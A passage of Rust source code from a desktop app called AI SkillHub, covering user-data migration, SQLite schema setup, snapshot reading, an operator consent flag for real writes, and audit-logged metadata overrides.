                        .get("Status")
                        .or_else(|| item.get("status"))
                        .and_then(Value::as_str)
                        .unwrap_or_default()
                        .to_string(),
                    message: item
                        .get("Message")
                        .or_else(|| item.get("message"))
                        .and_then(Value::as_str)
                        .unwrap_or_default()
                        .to_string(),
                })
                .collect()
        })
        .unwrap_or_default();
    SyncSummaryCard {
        generated_at: payload
            .get("generatedAt")
            .and_then(Value::as_str)
            .unwrap_or_default()
            .to_string(),
        status: payload
            .get("status")
            .and_then(Value::as_str)
            .unwrap_or_default()
            .to_string(),
        total: usize_field("total"),
        succeeded: usize_field("succeeded"),
        failed: usize_field("failed"),
        skipped: usize_field("skipped"),
        active_skills: usize_field("activeSkills"),
        repositories,
    }
}

fn skillhub_config_file(root: &Path) -> PathBuf {
    if cfg!(test) {
        app_next_runtime_root(root).join("skillhub.config.json")
    } else {
        user_data_root(root).join("skillhub.config.json")
    }
}

fn skillhub_script_file(root: &Path) -> PathBuf {
    app_next_runtime_root(root).join("SkillHub.ps1")
}

fn agent_link_script_file(root: &Path) -> PathBuf {
    app_next_runtime_root(root).join("Manage-AgentSkillLinks.ps1")
}

fn diagnostics_export_script_file(root: &Path) -> PathBuf {
    app_next_runtime_root(root).join("Export-SkillHubDiagnostics.ps1")
}

fn prepare_user_data(root: &Path) -> Result<(), String> {
    if cfg!(test) {
        return Ok(());
    }

    let data_root = user_data_root(root);
    let sources = managed_sources_dir(root);
    let skills = active_skills_dir(root);
    let state = private_state_dir(root);
    let reports = reports_dir(root);
    for path in [&data_root, &sources, &skills, &state, &reports] {
        fs::create_dir_all(path).map_err(|error| {
            format!(
                "Cannot create AI SkillHub user data folder {}: {}",
                path.display(),
                error
            )
        })?;
    }

    let legacy_skills = root.join("skills");
    if legacy_skills.exists() && legacy_skills != skills {
        copy_standalone_skill_folders(&legacy_skills, &skills)?;
    }

    let legacy_database = app_next_root(root)
        .join(".skillhub-next")
        .join("skillhub-next.sqlite3");
    let next_database = database_file(root);
    if !next_database.exists() && legacy_database.exists() && legacy_database != next_database {
        fs::copy(&legacy_database, &next_database).map_err(|error| {
            format!(
                "Cannot migrate AI SkillHub index {} to {}: {}",
                legacy_database.display(),
                next_database.display(),
                error
            )
        })?;
    }

    ensure_persistent_runtime_config(root)?;

    let manifest = data_root.join("migration-v3.json");
    if !manifest.exists() {
        let body = serde_json::to_string_pretty(&serde_json::json!({
            "schemaVersion": 3,
            "migratedAt": unix_timestamp_string(),
            "legacyRoot": root.display().to_string(),
            "sources": sources.display().to_string(),
            "skills": skills.display().to_string(),
            "database": next_database.display().to_string(),
            "strategy": "copy-only; legacy data retained"
        }))
        .map_err(|error| format!("Cannot serialize user data migration manifest: {}", error))?;
        fs::write(&manifest, format!("{body}\n")).map_err(|error| {
            format!(
                "Cannot write user data migration manifest {}: {}",
                manifest.display(),
                error
            )
        })?;
    }

    Ok(())
}

fn begin_migration_v4(
    root: &Path,
) -> Result<
    Option<(
        migration_v4::MigrationV4Config,
        migration_v4::SourceRecoveryReport,
    )>,
    String,
> {
    if cfg!(test) {
        return Ok(None);
    }

    if !migration_v4_is_pending(root) {
        return Ok(None);
    }

    let data_root = user_data_root(root);
    let manifest_path = data_root.join("migration-v4.json");
    let legacy_sources = app_next_root(root).join("data").join("github_sources");
    let current_sources = managed_sources_dir(root);

    let legacy_database = app_next_root(root)
        .join(".skillhub-next")
        .join("skillhub-next.sqlite3");
    let config = migration_v4::MigrationV4Config::new(
        legacy_sources,
        current_sources,
        data_root.join("state").join("migration-v4-staging"),
        legacy_database.is_file().then_some(legacy_database),
        Some(database_file(root)),
        data_root.join("backups").join("migration-v4"),
        manifest_path,
        false,
    );
    let source_recovery = migration_v4::recover_sources_v4(&config)
        .map_err(|error| format!("Cannot recover legacy v4 sources: {error}"))?;
    Ok(Some((config, source_recovery)))
}

fn migration_v4_is_pending(root: &Path) -> bool {
    if cfg!(test) {
        return false;
    }
    let legacy_sources = app_next_root(root).join("data").join("github_sources");
    let current_sources = managed_sources_dir(root);
    !user_data_root(root).join("migration-v4.json").exists()
        && legacy_sources.is_dir()
        && legacy_sources != current_sources
        && !directory_is_empty(&legacy_sources)
}

fn legacy_cleanup_config(root: &Path) -> legacy_cleanup::LegacyCleanupConfig {
    let data_root = user_data_root(root);
    legacy_cleanup::LegacyCleanupConfig::new(
        root,
        &data_root,
        data_root.join("migration-v4.json"),
        database_file(root),
        data_root
            .join("state")
            .join("backups")
            .join("legacy-cleanup"),
    )
}

fn directory_is_empty(path: &Path) -> bool {
    fs::read_dir(path)
        .map(|mut entries| entries.next().is_none())
        .unwrap_or(true)
}

fn copy_directory_tree(source: &Path, destination: &Path) -> Result<(), String> {
    let source_root = source.canonicalize().map_err(|error| {
        format!(
            "Cannot resolve migration source {}: {}",
            source.display(),
            error
        )
    })?;
    fs::create_dir_all(destination).map_err(|error| {
        format!(
            "Cannot create migration destination {}: {}",
            destination.display(),
            error
        )
    })?;

    for entry in fs::read_dir(source).map_err(|error| {
        format!(
            "Cannot read migration source {}: {}",
            source.display(),
            error
        )
    })? {
        let entry = entry.map_err(|error| format!("Cannot read migration entry: {}", error))?;
        let source_path = entry.path();
        let destination_path = destination.join(entry.file_name());
        let file_type = entry
            .file_type()
            .map_err(|error| format!("Cannot inspect {}: {}", source_path.display(), error))?;
        if file_type.is_symlink() {
            continue;
        }
        if file_type.is_dir() {
            let expected = source_root.join(entry.file_name());
            let resolved = source_path
                .canonicalize()
                .map_err(|error| format!("Cannot resolve {}: {}", source_path.display(), error))?;
            if resolved != expected {
                continue;
            }
            copy_directory_tree(&source_path, &destination_path)?;
        } else if file_type.is_file() && !destination_path.exists() {
            fs::copy(&source_path, &destination_path).map_err(|error| {
                format!(
                    "Cannot copy {} to {}: {}",
                    source_path.display(),
                    destination_path.display(),
                    error
                )
            })?;
        }
    }
    Ok(())
}

fn copy_standalone_skill_folders(source: &Path, destination: &Path) -> Result<(), String> {
    let source_root = source.canonicalize().map_err(|error| {
        format!(
            "Cannot resolve legacy Skills folder {}: {}",
            source.display(),
            error
        )
    })?;
    for entry in fs::read_dir(source).map_err(|error| {
        format!(
            "Cannot read legacy Skills folder {}: {}",
            source.display(),
            error
        )
    })? {
        let entry = entry.map_err(|error| format!("Cannot read legacy Skill entry: {}", error))?;
        let path = entry.path();
        if !entry
            .file_type()
            .map(|file_type| file_type.is_dir() && !file_type.is_symlink())
            .unwrap_or(false)
        {
            continue;
        }
        let expected = source_root.join(entry.file_name());
        let resolved = match path.canonicalize() {
            Ok(value) => value,
            Err(_) => continue,
        };
        if resolved != expected || !path.join("SKILL.md").is_file() {
            continue;
        }
        let target = destination.join(entry.file_name());
        if !target.exists() {
            copy_directory_tree(&path, &target)?;
        }
    }
    Ok(())
}

fn ensure_persistent_runtime_config(root: &Path) -> Result<(), String> {
    let config_path = skillhub_config_file(root);
    let legacy_path = app_next_runtime_root(root).join("skillhub.config.json");
    let mut config = read_json(&config_path)
        .or_else(|| read_json(&legacy_path))
        .unwrap_or_else(|| serde_json::json!({ "version": 3, "repositories": [] }));
    let object = config
        .as_object_mut()
        .ok_or_else(|| "AI SkillHub runtime config must be a JSON object.".to_string())?;
    object.insert("version".to_string(), Value::from(3));
    object.insert(
        "githubSourcesFolder".to_string(),
        Value::from(managed_sources_dir(root).display().to_string()),
    );
    object.insert(
        "activeSkillsFolder".to_string(),
        Value::from(active_skills_dir(root).display().to_string()),
    );
    object
        .entry("manageAgentLinks".to_string())
        .or_insert(Value::Bool(false));
    object
        .entry("autoDiscoverManualRepos".to_string())
        .or_insert(Value::Bool(true));
    object
        .entry("repositories".to_string())
        .or_insert_with(|| Value::Array(Vec::new()));
    let text = serde_json::to_string_pretty(&config)
        .map_err(|error| format!("Cannot serialize persistent runtime config: {}", error))?;
    fs::write(&config_path, format!("{text}\n")).map_err(|error| {
        format!(
            "Cannot write persistent runtime config {}: {}",
            config_path.display(),
            error
        )
    })
}

fn database_file(root: &Path) -> PathBuf {
    private_state_dir(root).join("skillhub-next.sqlite3")
}

fn open_index_database(root: &Path) -> Result<Connection, String> {
    let db_file = database_file(root);
    let db_parent = db_file
        .parent()
        .ok_or_else(|| "Cannot resolve v2 database folder.".to_string())?;
    fs::create_dir_all(db_parent).map_err(|error| {
        format!(
            "Cannot create v2 database folder {}: {}",
            db_parent.display(),
            error
        )
    })?;

    let connection = Connection::open(&db_file).map_err(|error| {
        format!(
            "Cannot open v2 SQLite database {}: {}",
            db_file.display(),
            error
        )
    })?;
    connection
        .execute_batch(include_str!("../migrations/001_initial.sql"))
        .map_err(|error| format!("Cannot apply v2 SQLite migration: {}", error))?;
    ensure_runtime_schema(&connection)?;
    seed_desktop_qa_checks(&connection)?;

    Ok(connection)
}

fn ensure_runtime_schema(connection: &Connection) -> Result<(), String> {
    connection
        .execute_batch(
            "CREATE TABLE IF NOT EXISTS skill_overrides (
                skill_id TEXT PRIMARY KEY,
                display_name TEXT NOT NULL DEFAULT '',
                category_id TEXT NOT NULL DEFAULT '',
                description TEXT NOT NULL DEFAULT '',
                note TEXT NOT NULL DEFAULT '',
                enabled INTEGER,
                rating INTEGER NOT NULL DEFAULT 0,
                updated_at TEXT NOT NULL
            );",
        )
        .map_err(|error| format!("Cannot ensure skill override table: {}", error))?;
    connection
        .execute_batch(
            "CREATE TABLE IF NOT EXISTS source_overrides (
                source_id TEXT PRIMARY KEY,
                display_name TEXT NOT NULL DEFAULT '',
                source_type TEXT NOT NULL DEFAULT '',
                category_id TEXT NOT NULL DEFAULT '',
                note TEXT NOT NULL DEFAULT '',
                enabled INTEGER,
                rating INTEGER NOT NULL DEFAULT 0,
                updated_at TEXT NOT NULL
            );
            CREATE TABLE IF NOT EXISTS usage_events (
                id TEXT PRIMARY KEY,
                target_type TEXT NOT NULL,
                target_id TEXT NOT NULL,
                target_name TEXT NOT NULL DEFAULT '',
                source_name TEXT NOT NULL DEFAULT '',
                event_type TEXT NOT NULL,
                created_at TEXT NOT NULL
            );
            CREATE TABLE IF NOT EXISTS source_popularity_cache (
                source_id TEXT PRIMARY KEY,
                source_name TEXT NOT NULL DEFAULT '',
                url TEXT NOT NULL DEFAULT '',
                owner TEXT NOT NULL DEFAULT '',
                repo TEXT NOT NULL DEFAULT '',
                created_at TEXT NOT NULL DEFAULT '',
                stars INTEGER NOT NULL DEFAULT 0,
                forks INTEGER NOT NULL DEFAULT 0,
                open_issues INTEGER NOT NULL DEFAULT 0,
                last_updated_at TEXT NOT NULL DEFAULT '',
                fetched_at TEXT NOT NULL DEFAULT '',
                cache_status TEXT NOT NULL DEFAULT 'missing',
                error TEXT NOT NULL DEFAULT ''
            );
            CREATE TABLE IF NOT EXISTS source_popularity_history (
                id TEXT PRIMARY KEY,
                source_id TEXT NOT NULL,
                source_name TEXT NOT NULL DEFAULT '',
                owner TEXT NOT NULL DEFAULT '',
                repo TEXT NOT NULL DEFAULT '',
                stars INTEGER NOT NULL DEFAULT 0,
                forks INTEGER NOT NULL DEFAULT 0,
                open_issues INTEGER NOT NULL DEFAULT 0,
                last_updated_at TEXT NOT NULL DEFAULT '',
                sampled_at TEXT NOT NULL,
                cache_status TEXT NOT NULL DEFAULT 'fresh',
                error TEXT NOT NULL DEFAULT ''
            );
            CREATE TABLE IF NOT EXISTS operator_preferences (
                key TEXT PRIMARY KEY,
                value TEXT NOT NULL DEFAULT '',
                updated_at TEXT NOT NULL
            );
            CREATE TABLE IF NOT EXISTS source_tags (
                source_id TEXT NOT NULL,
                tag_id TEXT NOT NULL,
                PRIMARY KEY(source_id, tag_id),
                FOREIGN KEY(source_id) REFERENCES sources(id),
                FOREIGN KEY(tag_id) REFERENCES tags(id)
            );
            CREATE TABLE IF NOT EXISTS skill_tag_overrides (
                skill_id TEXT NOT NULL,
                tag_id TEXT NOT NULL,
                updated_at TEXT NOT NULL,
                PRIMARY KEY(skill_id, tag_id),
                FOREIGN KEY(skill_id) REFERENCES skills(id),
                FOREIGN KEY(tag_id) REFERENCES tags(id)
            );
            CREATE TABLE IF NOT EXISTS source_tag_overrides (
                source_id TEXT NOT NULL,
                tag_id TEXT NOT NULL,
                updated_at TEXT NOT NULL,
                PRIMARY KEY(source_id, tag_id),
                FOREIGN KEY(source_id) REFERENCES sources(id),
                FOREIGN KEY(tag_id) REFERENCES tags(id)
            );
            CREATE TABLE IF NOT EXISTS skill_folders (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                note TEXT NOT NULL DEFAULT '',
                color TEXT NOT NULL DEFAULT 'cyan',
                sort_order INTEGER NOT NULL DEFAULT 0,
                created_at TEXT NOT NULL,
                updated_at TEXT NOT NULL
            );
            CREATE UNIQUE INDEX IF NOT EXISTS idx_skill_folders_name_nocase
                ON skill_folders(name COLLATE NOCASE);
            CREATE TABLE IF NOT EXISTS skill_folder_memberships (
                skill_id TEXT PRIMARY KEY,
                folder_id TEXT NOT NULL,
                sort_order INTEGER NOT NULL DEFAULT 0,
                updated_at TEXT NOT NULL,
                FOREIGN KEY(folder_id) REFERENCES skill_folders(id) ON DELETE CASCADE
            );
            CREATE INDEX IF NOT EXISTS idx_skill_folder_memberships_folder
                ON skill_folder_memberships(folder_id, sort_order, skill_id);
            CREATE TABLE IF NOT EXISTS source_folder_memberships (
                source_id TEXT PRIMARY KEY,
                folder_id TEXT NOT NULL,
                sort_order INTEGER NOT NULL DEFAULT 0,
                updated_at TEXT NOT NULL,
                FOREIGN KEY(folder_id) REFERENCES skill_folders(id) ON DELETE CASCADE
            );
            CREATE INDEX IF NOT EXISTS idx_source_folder_memberships_folder
                ON source_folder_memberships(folder_id, sort_order, source_id);
            CREATE TABLE IF NOT EXISTS preset_workspaces (
                preset_id TEXT NOT NULL,
                workspace_id TEXT NOT NULL,
                enabled INTEGER NOT NULL DEFAULT 0,
                updated_at TEXT NOT NULL,
                PRIMARY KEY(preset_id, workspace_id),
                FOREIGN KEY(preset_id) REFERENCES presets(id),
                FOREIGN KEY(workspace_id) REFERENCES workspaces(id)
            );
            CREATE TABLE IF NOT EXISTS operation_runs (
                id TEXT PRIMARY KEY,
                runner_id TEXT NOT NULL,
                status TEXT NOT NULL,
                summary TEXT NOT NULL DEFAULT '',
                report_path TEXT NOT NULL DEFAULT '',
                created_at TEXT NOT NULL
            );
            CREATE TABLE IF NOT EXISTS skill_conflict_choices (
                conflict_key TEXT PRIMARY KEY,
                default_skill_id TEXT NOT NULL DEFAULT '',
                status TEXT NOT NULL DEFAULT 'unresolved',
                updated_at TEXT NOT NULL
            );",
        )
        .map_err(|error| format!("Cannot ensure v2 metadata event tables: {}", error))?;
    // v3.1.6 migration: a user folder owns the complete source tree. Any legacy
    // child-only assignments that agree on one folder are promoted once, then
    // removed so future children inherit without materialized rows.
    connection
        .execute_batch(
            "INSERT OR IGNORE INTO source_folder_memberships (source_id, folder_id, sort_order, updated_at)
             SELECT skills.source_id, MIN(skill_folder_memberships.folder_id), 0,
                    MAX(skill_folder_memberships.updated_at)
             FROM skill_folder_memberships
             INNER JOIN skills ON skills.id = skill_folder_memberships.skill_id
             WHERE skills.source_id IS NOT NULL AND skills.source_id <> ''
             GROUP BY skills.source_id
             HAVING COUNT(DISTINCT skill_folder_memberships.folder_id) = 1;
             DELETE FROM skill_folder_memberships
             WHERE skill_id IN (
                SELECT skills.id
                FROM skills
                INNER JOIN source_folder_memberships
                    ON source_folder_memberships.source_id = skills.source_id
             );",
        )
        .map_err(|error| format!("Cannot migrate source-tree folder assignments: {}", error))?;
    ensure_column(connection, "skill_overrides", "enabled", "INTEGER")?;
    ensure_column(
        connection,
        "skill_overrides",
        "rating",
        "INTEGER NOT NULL DEFAULT 0",
    )?;
    ensure_column(
        connection,
        "source_overrides",
        "rating",
        "INTEGER NOT NULL DEFAULT 0",
    )?;
    source_governance::ensure_schema(connection)?;
    ensure_column(
        connection,
        "workspaces",
        "enabled",
        "INTEGER NOT NULL DEFAULT 1",
    )?;
    ensure_column(
        connection,
        "presets",
        "enabled",
        "INTEGER NOT NULL DEFAULT 1",
    )?;
    ensure_column(
        connection,
        "project_scans",
        "has_agents_md",
        "INTEGER NOT NULL DEFAULT 0",
    )?;
    ensure_column(
        connection,
        "project_scans",
        "has_claude_md",
        "INTEGER NOT NULL DEFAULT 0",
    )?;
    ensure_column(
        connection,
        "project_scans",
        "has_readme_md",
        "INTEGER NOT NULL DEFAULT 0",
    )?;
    ensure_column(
        connection,
        "source_popularity_cache",
        "created_at",
        "TEXT NOT NULL DEFAULT ''",
    )?;
    // Router-hub (parent) Skill marker. Promoted from JS heuristics to a real column
    // so the UI no longer needs to sniff description strings.
    ensure_column(
        connection,
        "skills",
        "is_router_hub",
        "INTEGER NOT NULL DEFAULT 0",
    )?;
    for (table, column, definition) in [
        ("skills", "usage_guide", "TEXT NOT NULL DEFAULT ''"),
        (
            "skills",
            "metadata_origin",
            "TEXT NOT NULL DEFAULT 'legacy'",
        ),
        ("skills", "metadata_confidence", "REAL NOT NULL DEFAULT 0"),
        ("sources", "usage_guide", "TEXT NOT NULL DEFAULT ''"),
        (
            "sources",
            "metadata_origin",
            "TEXT NOT NULL DEFAULT 'legacy'",
        ),
        ("sources", "metadata_confidence", "REAL NOT NULL DEFAULT 0"),
    ] {
        ensure_column(connection, table, column, definition)?;
    }
    Ok(())
}

fn ensure_column(
    connection: &Connection,
    table_name: &str,
    column_name: &str,
    definition: &str,
) -> Result<(), String> {
    let mut statement = connection
        .prepare(&format!("PRAGMA table_info({})", table_name))
        .map_err(|error| format!("Cannot inspect table {}: {}", table_name, error))?;
    let columns = statement
        .query_map([], |row| row.get::<_, String>(1))
        .map_err(|error| format!("Cannot read columns for {}: {}", table_name, error))?;

    for column in columns {
        if column.map_err(|error| format!("Cannot decode column name: {}", error))? == column_name {
            return Ok(());
        }
    }

    connection
        .execute(
            &format!(
                "ALTER TABLE {} ADD COLUMN {} {}",
                table_name, column_name, definition
            ),
            [],
        )
        .map_err(|error| {
            format!(
                "Cannot add column {}.{} to v2 database: {}",
                table_name, column_name, error
            )
        })?;

    Ok(())
}

fn read_snapshot_from_database(
    root: &Path,
    connection: &Connection,
) -> Result<LegacySnapshot, String> {
    let skills = read_indexed_skills(connection)?;
    let mut sources = read_indexed_sources(connection)?;
    hydrate_source_urls_from_git(root, &mut sources);
    let agents = read_indexed_agents(connection)?;
    let agent_skill_statuses = derive_agent_skill_statuses(root, &skills, &agents);
    let agent_adapters = read_indexed_agent_adapters(connection)?;
    let agent_doctors =
        derive_agent_doctors(read_json(&diagnostics_file(root)).as_ref(), &agent_adapters);
    let adapter_safety_checks = read_indexed_adapter_safety_checks(connection)?;
    let adapter_capabilities = read_indexed_adapter_capabilities(connection)?;
    let workspaces = read_indexed_workspaces(connection)?;
    let project_scans = read_indexed_project_scans(connection)?;
    let presets = read_indexed_presets(connection)?;
    let snapshots = read_indexed_snapshots(connection)?;
    let backup_targets = read_indexed_backup_targets(connection)?;
    let backup_dry_run = read_indexed_backup_dry_run(connection)?;
    let restore_dry_run = read_indexed_restore_dry_run(connection)?;
    let rollback_plan = read_indexed_rollback_plan(connection)?;
    let desktop_qa_checks = read_indexed_desktop_qa_checks(connection)?;
    let usage_stats = read_indexed_usage_stats(connection)?;
    let source_popularity = read_indexed_source_popularity(connection, &sources, &usage_stats)?;
    let source_governance = source_governance::read_governance_cards(root, connection, &sources)?;
    let source_quality_signals = source_governance::read_quality_signals(connection, &sources)?;
    let last_sync_summary = read_last_sync_summary(root);
    let skill_conflict_choices = read_skill_conflict_choice_state(connection)?;
    let skill_conflicts = derive_skill_conflicts(&skills, &skill_conflict_choices);
    let operator_consent = read_operator_consent(connection)?;
    let tags = read_indexed_tags(connection)?;
    let skill_folders = read_indexed_skill_folders(connection)?;
    let preset_distributions = read_indexed_preset_distributions(connection)?;
    let operation_runners = read_indexed_operation_runners(connection, root)?;
    let audit_events = read_indexed_audit_events(connection)?;
    let diagnostics = read_indexed_diagnostics(connection);
    let index = read_index_report(
        connection,
        &database_file(root),
        sources.len(),
        skills.len(),
        agents.len(),
    )?;

    let prompts = sources
        .iter()
        .filter(|source| source.source_type.eq_ignore_ascii_case("prompt"))
        .count();
    let warnings = skills.iter().filter(|skill| skill.health != "ok").count();
    let agents_detected = agents.iter().filter(|agent| agent.detected).count();
    let skills_dir = active_skills_dir(root);
    let sources_dir = active_sources_dir(root);
    let diagnostics_file = diagnostics_file(root);
    let release_reports = derive_release_reports(root);
    let import_previews = derive_import_previews(&sources_dir, &sources, &release_reports);
    let write_gates = derive_write_gates(
        &diagnostics,
        &release_reports,
        &import_previews,
        &backup_dry_run,
        &restore_dry_run,
        &rollback_plan,
        &desktop_qa_checks,
        &agent_adapters,
        &operation_runners,
        &operator_consent,
    );

    Ok(LegacySnapshot {
        root: root.display().to_string(),
        skills_dir: skills_dir.display().to_string(),
        sources_dir: sources_dir.display().to_string(),
        diagnostics_file: diagnostics_file.display().to_string(),
        mode: "sqlite-index".to_string(),
        summary: LegacySummary {
            skills: skills.len(),
            sources: sources.len(),
            prompts,
            agents_detected,
            warnings,
            diagnostics_status: diagnostics.overall_status.clone(),
        },
        skills,
        sources,
        agents,
        agent_skill_statuses,
        agent_adapters,
        agent_doctors,
        adapter_safety_checks,
        adapter_capabilities,
        workspaces,
        project_scans,
        presets,
        snapshots,
        backup_targets,
        backup_dry_run,
        restore_dry_run,
        rollback_plan,
        release_reports,
        import_previews,
        source_popularity,
        source_governance,
        source_quality_signals,
        last_sync_summary,
        skill_conflicts,
        operator_consent,
        tags,
        skill_folders,
        preset_distributions,
        operation_runners,
        write_gates,
        desktop_qa_checks,
        usage_stats,
        audit_events,
        diagnostics,
        index,
    })
}

fn set_enabled_state(table_name: &str, id: &str, enabled: bool) -> Result<(), String> {
    let root = resolve_legacy_root()?;
    let connection = open_index_database(&root)?;
    let statement = match table_name {
        "agent_adapters" => "UPDATE agent_adapters SET enabled = ?1, updated_at = ?2 WHERE id = ?3",
        "workspaces" => "UPDATE workspaces SET enabled = ?1, updated_at = ?2 WHERE id = ?3",
        "presets" => "UPDATE presets SET enabled = ?1, updated_at = ?2 WHERE id = ?3",
        _ => return Err("Unsupported enable state target.".to_string()),
    };
    let timestamp = unix_timestamp_string();
    let changed = connection
        .execute(
            statement,
            params![if enabled { 1 } else { 0 }, timestamp, id],
        )
        .map_err(|error| format!("Cannot update enabled state for {}: {}", id, error))?;

    if changed == 0 {
        return Err(format!("Cannot find v2 state target {}.", id));
    }

    connection
        .execute(
            "INSERT INTO audit_events (
                id, event_type, summary, detail_json, created_at
            ) VALUES (?1, 'state_updated', ?2, ?3, ?4)",
            params![
                format!("audit-state-{}-{}", timestamp, stable_id("target", id)),
                format!("Updated {} enabled state", table_name),
                serde_json::to_string(&serde_json::json!({
                    "table": table_name,
                    "id": id,
                    "enabled": enabled,
                    "scope": "v2-sqlite-only"
                }))
                .unwrap_or_else(|_| "{}".to_string()),
                timestamp
            ],
        )
        .map_err(|error| format!("Cannot write v2 state audit event: {}", error))?;

    Ok(())
}

fn read_operator_consent(connection: &Connection) -> Result<OperatorConsentCard, String> {
    let enabled_row = connection
        .query_row(
            "SELECT value, updated_at FROM operator_preferences WHERE key = 'real_writes_enabled'",
            [],
            |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?)),
        )
        .optional()
        .map_err(|error| format!("Cannot read real write authorization: {}", error))?;
    let enabled_at = connection
        .query_row(
            "SELECT value FROM operator_preferences WHERE key = 'real_writes_enabled_at'",
            [],
            |row| row.get::<_, String>(0),
        )
        .optional()
        .map_err(|error| format!("Cannot read real write authorization timestamp: {}", error))?
        .unwrap_or_default();
    let (value, updated_at) = enabled_row.unwrap_or_else(|| ("0".to_string(), String::new()));
    let real_writes_enabled = matches!(value.as_str(), "1" | "true" | "yes");
    let summary = if real_writes_enabled {
        "已允许 AI SkillHub 更新受管理的 AI 工具目录；每次写入仍会执行路径校验并保留诊断记录。"
            .to_string()
    } else {
        "真实写入授权未开启；当前只允许 dry-run、报告和 SQLite 元数据。".to_string()
    };

    Ok(OperatorConsentCard {
        real_writes_enabled,
        enabled_at,
        updated_at,
        summary,
    })
}

fn set_real_write_authorization_in_connection(
    connection: &Connection,
    enabled: bool,
) -> Result<(), String> {
    let timestamp = unix_timestamp_string();
    connection
        .execute(
            "INSERT INTO operator_preferences (key, value, updated_at)
            VALUES ('real_writes_enabled', ?1, ?2)
            ON CONFLICT(key) DO UPDATE SET
                value = excluded.value,
                updated_at = excluded.updated_at",
            params![if enabled { "1" } else { "0" }, &timestamp],
        )
        .map_err(|error| format!("Cannot update real write authorization: {}", error))?;
    connection
        .execute(
            "INSERT INTO operator_preferences (key, value, updated_at)
            VALUES ('real_writes_enabled_at', ?1, ?2)
            ON CONFLICT(key) DO UPDATE SET
                value = excluded.value,
                updated_at = excluded.updated_at",
            params![if enabled { timestamp.as_str() } else { "" }, &timestamp],
        )
        .map_err(|error| {
            format!(
                "Cannot update real write authorization timestamp: {}",
                error
            )
        })?;
    connection
        .execute(
            "INSERT INTO audit_events (
                id, event_type, summary, detail_json, created_at
            ) VALUES (?1, 'real_write_authorization_updated', ?2, ?3, ?4)",
            params![
                format!("audit-real-write-authorization-{}", timestamp),
                if enabled {
                    "Operator enabled real write authorization."
                } else {
                    "Operator disabled real write authorization."
                },
                serde_json::to_string(&serde_json::json!({
                    "enabled": enabled,
                    "scope": "authorization-only",
                    "doesNotBypassReleaseGate": true
                }))
                .unwrap_or_else(|_| "{}".to_string()),
                timestamp
            ],
        )
        .map_err(|error| {
            format!(
                "Cannot write real write authorization audit event: {}",
                error
            )
        })?;

    Ok(())
}

fn set_desktop_qa_status(id: &str, status: &str) -> Result<(), String> {
    if !matches!(status, "pending" | "passed" | "failed") {
        return Err("Unsupported desktop QA status.".to_string());
    }

    let root = resolve_legacy_root()?;
    let connection = open_index_database(&root)?;
    let timestamp = unix_timestamp_string();
    let changed = connection
        .execute(
            "UPDATE desktop_qa_checks SET status = ?1, updated_at = ?2 WHERE id = ?3",
            params![status, timestamp, id],
        )
        .map_err(|error| format!("Cannot update desktop QA check {}: {}", id, error))?;

    if changed == 0 {
        return Err(format!("Cannot find desktop QA check {}.", id));
    }

    connection
        .execute(
            "INSERT INTO audit_events (
                id, event_type, summary, detail_json, created_at
            ) VALUES (?1, 'desktop_qa_updated', ?2, ?3, ?4)",
            params![
                format!("audit-desktop-qa-{}-{}", timestamp, stable_id("qa", id)),
                "Updated desktop QA check status",
                serde_json::to_string(&serde_json::json!({
                    "id": id,
                    "status": status,
                    "scope": "v2-sqlite-only"
                }))
                .unwrap_or_else(|_| "{}".to_string()),
                timestamp
            ],
        )
        .map_err(|error| format!("Cannot write desktop QA audit event: {}", error))?;

    Ok(())
}

fn set_skill_metadata_override(
    folder_name: &str,
    name: &str,
    category: &str,
    description: &str,
    note: &str,
) -> Result<(), String> {
    let root = resolve_legacy_root()?;
    let connection = open_index_database(&root)?;
    set_skill_metadata_override_in_connection(
        &connection,
        folder_name,
        name,
        category,
        description,
        note,
    )
}

fn set_skill_rating_override(folder_name: &str, rating: u8) -> Result<(), String> {
    let root = resolve_legacy_root()?;
    let connection = open_index_database(&root)?;
    set_skill_rating_override_in_connection(&connection, folder_name, rating)
}

fn set_source_rating_override(source_id: &str, rating: u8) -> Result<(), String> {
    let root = resolve_legacy_root()?;
    let connection = open_index_database(&root)?;
    set_source_rating_override_in_connection(&connection, source_id, rating)
}

fn set_source_metadata_override_in_connection(
    connection: &Connection,
    source_id: &str,
    name: &str,
    source_type: &str,
    category: &str,
    note: &str,
    enabled: bool,
) -> Result<(), String> {
    let source_id = compact_note(source_id);
    let display_name = compact_note(name);
    let source_type = normalize_source_type(&compact_note(source_type));
    let category = compact_note(category);
    let note = compact_note(note);

    if source_id.is_empty() {
        return Err("Source id is required.".to_string());
    }
    if display_name.is_empty() {
        return Err("Source name cannot be empty.".to_string());
    }
    if display_name.len() > 120 {
        return Err("来源名称过长，请控制在 120 个字符以内。".to_string());
    }
    if category.len() > 80 {
        return Err("来源分类过长，请控制在 80 个字符以内。".to_string());
    }
    if note.len() > 2000 {
        return Err("来源备注过长，请控制在 2000 个字符以内。".to_string());
    }

    let exists: Option<String> = connection
        .query_row(
            "SELECT id FROM sources WHERE id = ?1 LIMIT 1",
            params![&source_id],
            |row| row.get(0),
        )
        .optional()
        .map_err(|error| format!("Cannot locate source {}: {}", source_id, error))?;
    exists.ok_or_else(|| format!("Cannot find indexed source {}.", source_id))?;

    let timestamp = unix_timestamp_string();
    connection
        .execute(
            "INSERT INTO source_overrides (
                source_id, display_name, source_type, category_id, note, enabled, updated_at
            ) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7)
            ON CONFLICT(source_id) DO UPDATE SET
                display_name = excluded.display_name,
                source_type = excluded.source_type,
                category_id = excluded.category_id,
                note = excluded.note,
                enabled = excluded.enabled,
                updated_at = excluded.updated_at",
            params![
                &source_id,
                &display_name,
                &source_type,
                &category,
                &note,
                if enabled { 1 } else { 0 },
                &timestamp
            ],
        )
        .map_err(|error| format!("Cannot save source metadata override: {}", error))?;

    connection
        .execute(
            "INSERT INTO audit_events (
                id, event_type, summary, detail_json, created_at
            ) VALUES (?1, 'source_metadata_updated', ?2, ?3, ?4)",
            params![
                format!(
                    "audit-source-meta-{}-{}",
                    timestamp,
                    stable_id("source", &source_id)
                ),
                "Updated source metadata override",
                serde_json::to_string(&serde_json::json!({
                    "sourceId": source_id,
                    "sourceType": source_type,
                    "enabled": enabled,
                    "scope": "v2-sqlite-only"
                }))
                .unwrap_or_else(|_| "{}".to_string()),
                timestamp
            ],
        )
        .map_err(|error| format!("Cannot write source metadata audit event: {}", error))?;

    Ok(())
}

fn set_sources_bulk_metadata_in_connection(
    connection: &Connection,
    source_ids: &[String],
